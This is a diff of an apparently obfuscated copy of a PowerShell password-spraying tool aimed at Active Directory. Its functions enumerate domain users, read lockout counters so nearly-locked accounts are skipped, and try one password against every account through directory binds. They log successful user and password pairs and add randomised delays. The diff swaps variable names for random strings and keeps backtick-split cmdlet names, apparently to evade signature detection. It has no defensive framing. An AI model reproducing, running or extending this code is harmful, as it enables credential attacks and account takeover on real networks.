+    $UScKFzKSynKzWrsHWUsdNSCaJvJZQgZiHgtkuMwzWAEq = $QTqfzDjRPWjWfTvaipcqYYxAbTMP.FindAll()
+    Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor "yellow" ("[*] There are " + $UScKFzKSynKzWrsHWUsdNSCaJvJZQgZiHgtkuMwzWAEq.count + " total users found.")
+    $UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP = @()
 
-    if ($SawNose)
+    if ($izThjGSxBeDGVIiKsZugyiOPOGCNNReunEP)
     {
-        Write-PeckWant -ForegroundColor "yellow" "[*] Removing users within 1 attempt of locking out from list."
-        foreach ($MixCrib in $CooingMiddle)
+        Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor "yellow" "[*] Removing users within 1 attempt of locking out from list."
+        foreach ($TluzWsgkUTwPJXJnVbtRWALeRtaFuMNkqa in $UScKFzKSynKzWrsHWUsdNSCaJvJZQgZiHgtkuMwzWAEq)
         {
             # Microsoft".
-            $CurvyClap = $MixCrib.Properties.badpwdcount
-            $ProudFuel = $MixCrib.Properties.samaccountname
+            $dCLDlPXWNmXxXygPZVGyazuSuSxWCNkn = $TluzWsgkUTwPJXJnVbtRWALeRtaFuMNkqa.Properties.badpwdcount
+            $FyGaEdxjiJvFZRTvwBhDkAjUmNxlfEjlNpXDsIFA = $TluzWsgkUTwPJXJnVbtRWALeRtaFuMNkqa.Properties.samaccountname
             try
             {
-                $TrySoggy = $MixCrib.Properties.badpasswordtime[0]
+                $jYZgTSCLTBEXEvllnGEcYOFD = $TluzWsgkUTwPJXJnVbtRWALeRtaFuMNkqa.Properties.badpasswordtime[0]
             }
             catch
             {
                 continue
             }
-            $StripNormal = Get-Date
-            $HealthDoubt = [DateTime]::FromFileTime($TrySoggy)
-            $PlanesDesert = ($StripNormal - $HealthDoubt).TotalMinutes
+            $OhzeBykBeGaEIIfmiyWvMpICCxUiCFYdOqMwhEYRtIQqQ = Get-Date
+            $NtbwSLIVPXftpBDOkHVOiglvulcRnuWMcGQIhcG = [DateTime]::FromFileTime($jYZgTSCLTBEXEvllnGEcYOFD)
+            $ksidMHxkvqBTJlqpugZMeHyeBNoVv = ($OhzeBykBeGaEIIfmiyWvMpICCxUiCFYdOqMwhEYRtIQqQ - $NtbwSLIVPXftpBDOkHVOiglvulcRnuWMcGQIhcG).TotalMinutes
 
-            if ($CurvyClap)
+            if ($dCLDlPXWNmXxXygPZVGyazuSuSxWCNkn)
             {
-                [int]$HealthVoice = [convert]::ToInt32($CurvyClap, 10)
-                $SinkPuny = $CoachWait - $HealthVoice
+                [int]$dwiIkNqcMJOFKeAsWSTjWpdxkDmCKuWe = [convert]::ToInt32($dCLDlPXWNmXxXygPZVGyazuSuSxWCNkn, 10)
+                $utCVGDCThLvgJzgnBJGcLlVjXTi = $ucpOLyHmtPTkuRlQRTXbSvp - $dwiIkNqcMJOFKeAsWSTjWpdxkDmCKuWe
                 # Microsoft".
                 # Microsoft".
                 # Microsoft".
-                if (($PlanesDesert -gt $WishNest) -or ($SinkPuny -gt 1))
+                if (($ksidMHxkvqBTJlqpugZMeHyeBNoVv -gt $wXvoGCngektZSlKgLEgqTLcJQrfgAFvATSBVVbpJOSF) -or ($utCVGDCThLvgJzgnBJGcLlVjXTi -gt 1))
                                 {
-                    $IrateSoak += $ProudFuel
+                    $UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP += $FyGaEdxjiJvFZRTvwBhDkAjUmNxlfEjlNpXDsIFA
                 }
             }
         }
     }
     else
     {
-        foreach ($MixCrib in $CooingMiddle)
+        foreach ($TluzWsgkUTwPJXJnVbtRWALeRtaFuMNkqa in $UScKFzKSynKzWrsHWUsdNSCaJvJZQgZiHgtkuMwzWAEq)
         {
-            $ProudFuel = $MixCrib.Properties.samaccountname
-            $IrateSoak += $ProudFuel
+            $FyGaEdxjiJvFZRTvwBhDkAjUmNxlfEjlNpXDsIFA = $TluzWsgkUTwPJXJnVbtRWALeRtaFuMNkqa.Properties.samaccountname
+            $UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP += $FyGaEdxjiJvFZRTvwBhDkAjUmNxlfEjlNpXDsIFA
         }
     }
 
-    Write-PeckWant -foregroundcolor "yellow" ("[*] Created a userlist containing " + $IrateSoak.count + " users gathered from the current user's domain")
-    return $IrateSoak
+    Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -foregroundcolor "yellow" ("[*] Created a userlist containing " + $UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP.count + " users gathered from the current user's domain")
+    return $UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP
 }
 
 function Invoke-SpraySinglePassword
 {
     param(
             [Parameter(Position=1)]
-            $SmokeAbsurd,
+            $VUNqJWGTtyPXqKixyjXmCIFL,
             [Parameter(Position=2)]
             [string[]]
-            $IrateSoak,
+            $UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP,
             [Parameter(Position=3)]
             [string]
-            $MateFire,
+            $yZZWOdVtOiPGRmclTbPHVnBMEd,
             [Parameter(Position=4)]
             [string]
-            $MeddleExist,
+            $JujBZYfgFHhJKyimboqhYgtDhyFJpVXrRqFaXUVrb,
             [Parameter(Position=5)]
             [int]
-            $WorryTrust=0,
+            $kHjZyYzhuvGYjORGkHNzNgWrfjofwJrDIg=0,
             [Parameter(Position=6)]
             [double]
-            $SuddenGroan=0,
+            $uDOubCzUPnREBSArGQwMgYfMfHnFmPQyAHDlZ=0,
             [Parameter(Position=7)]
             [switch]
-            $GrowthFowl,
+            $CzQPaiMVlezHLOsaoSbLGjgOKF,
             [Parameter(Position=7)]
             [switch]
-            $HammerMuscle
+            $uvVuEMVAxXuSnaLYyrNOCrvPVBYHKTrQZrJqFAbIOQU
     )
-    $FuelWhite = Get-Date
-    $IronShaggy = $IrateSoak.count
-    Write-PeckWant "[*] Now trying password $MateFire against $IronShaggy users. Current time is $($FuelWhite.ToShortTimeString())"
-    $RedLethal = 0
-    if ($MeddleExist -ne ""-and -not $HammerMuscle)
+    $MNDYZafyDCPacRuILnEgznT = Get-Date
+    $UzoiTutuPrrkrFRULUMXvg = $UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP.count
+    Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh "[*] Now trying password $yZZWOdVtOiPGRmclTbPHVnBMEd against $UzoiTutuPrrkrFRULUMXvg users. Current time is $($MNDYZafyDCPacRuILnEgznT.ToShortTimeString())"
+    $jSWCQEztnZRNuuUWBKTciUfliWaIvlknMKtwe = 0
+    if ($JujBZYfgFHhJKyimboqhYgtDhyFJpVXrRqFaXUVrb -ne ""-and -not $uvVuEMVAxXuSnaLYyrNOCrvPVBYHKTrQZrJqFAbIOQU)
     {
-        Write-PeckWant -ForegroundColor Yellow "[*] Writing successes to $MeddleExist"    
+        Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor Yellow "[*] Writing successes to $JujBZYfgFHhJKyimboqhYgtDhyFJpVXrRqFaXUVrb"    
     }
-    $SticksMist = ne`w`-`ob`je`ct System.Random
+    $XHcfKLZlwpTvSBvwCaUTsZWjZSXczzgoGcujvRj = ne`w`-ob`je`ct System.Random
 
-    foreach ($MixCrib in $IrateSoak)
+    foreach ($TluzWsgkUTwPJXJnVbtRWALeRtaFuMNkqa in $UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP)
     {
-        if ($GrowthFowl)
+        if ($CzQPaiMVlezHLOsaoSbLGjgOKF)
         {
-            $MateFire = $MixCrib
+            $yZZWOdVtOiPGRmclTbPHVnBMEd = $TluzWsgkUTwPJXJnVbtRWALeRtaFuMNkqa
         }
-        $ArtGlib = ne`w`-`ob`je`ct System.DirectoryServices.DirectoryEntry($SmokeAbsurd,$MixCrib,$MateFire)
-        if ($ArtGlib.name -ne $null)
+        $FsQrixyfdvUtgJzLkGujegdgLPOX = ne`w`-ob`je`ct System.DirectoryServices.DirectoryEntry($VUNqJWGTtyPXqKixyjXmCIFL,$TluzWsgkUTwPJXJnVbtRWALeRtaFuMNkqa,$yZZWOdVtOiPGRmclTbPHVnBMEd)
+        if ($FsQrixyfdvUtgJzLkGujegdgLPOX.name -ne $null)
         {
-            if ($MeddleExist -ne "")
+            if ($JujBZYfgFHhJKyimboqhYgtDhyFJpVXrRqFaXUVrb -ne "")
             {
-                Add-Content $MeddleExist $MixCrib`:$MateFire
+                Add-Content $JujBZYfgFHhJKyimboqhYgtDhyFJpVXrRqFaXUVrb $TluzWsgkUTwPJXJnVbtRWALeRtaFuMNkqa`:$yZZWOdVtOiPGRmclTbPHVnBMEd
             }
-            Write-PeckWant -ForegroundColor Green "[*] SUCCESS! User:$MixCrib Password:$MateFire"
+            Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor Green "[*] SUCCESS! User:$TluzWsgkUTwPJXJnVbtRWALeRtaFuMNkqa Password:$yZZWOdVtOiPGRmclTbPHVnBMEd"
         }
-        $RedLethal += 1
-        if (-not $HammerMuscle)
+        $jSWCQEztnZRNuuUWBKTciUfliWaIvlknMKtwe += 1
+        if (-not $uvVuEMVAxXuSnaLYyrNOCrvPVBYHKTrQZrJqFAbIOQU)
         {
-            Write-PeckWant -nonewline "$RedLethal of $IronShaggy users tested`r"
+            Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -nonewline "$jSWCQEztnZRNuuUWBKTciUfliWaIvlknMKtwe of $UzoiTutuPrrkrFRULUMXvg users tested`r"
         }
-        if ($WorryTrust)
+        if ($kHjZyYzhuvGYjORGkHNzNgWrfjofwJrDIg)
         {
-            Start-Sleep -FuzzyFlight $SticksMist.Next((1-$SuddenGroan)*$WorryTrust, (1+$SuddenGroan)*$WorryTrust)
+            Start-Sleep -MKYrXEZuOczNIXEksnpqPeRQDrxx $XHcfKLZlwpTvSBvwCaUTsZWjZSXczzgoGcujvRj.Next((1-$uDOubCzUPnREBSArGQwMgYfMfHnFmPQyAHDlZ)*$kHjZyYzhuvGYjORGkHNzNgWrfjofwJrDIg, (1+$uDOubCzUPnREBSArGQwMgYfMfHnFmPQyAHDlZ)*$kHjZyYzhuvGYjORGkHNzNgWrfjofwJrDIg)
         }
     }
 
 }
 
-function Get-ObservationWindow($TenderWoozy)
+function Get-ObservationWindow($VsLfmDPxHioScTgupxbfpwILMvaiNvGZwDnLtYZjX)
 {
     # Microsoft".
     # Microsoft".
-    $DrinkMind = $TenderWoozy.Properties['lockoutObservationWindow']
-    $WishNest = $TenderWoozy.ConvertLargeIntegerToInt64($DrinkMind.Value) / -600000000
-    return $WishNest
+    $TqImTEJVzduriDfBjoQzkEvouHRViIlxxCYfDzFMeAV = $VsLfmDPxHioScTgupxbfpwILMvaiNvGZwDnLtYZjX.Properties['lockoutObservationWindow']
+    $wXvoGCngektZSlKgLEgqTLcJQrfgAFvATSBVVbpJOSF = $VsLfmDPxHioScTgupxbfpwILMvaiNvGZwDnLtYZjX.ConvertLargeIntegerToInt64($TqImTEJVzduriDfBjoQzkEvouHRViIlxxCYfDzFMeAV.Value) / -600000000
+    return $wXvoGCngektZSlKgLEgqTLcJQrfgAFvATSBVVbpJOSF
 }
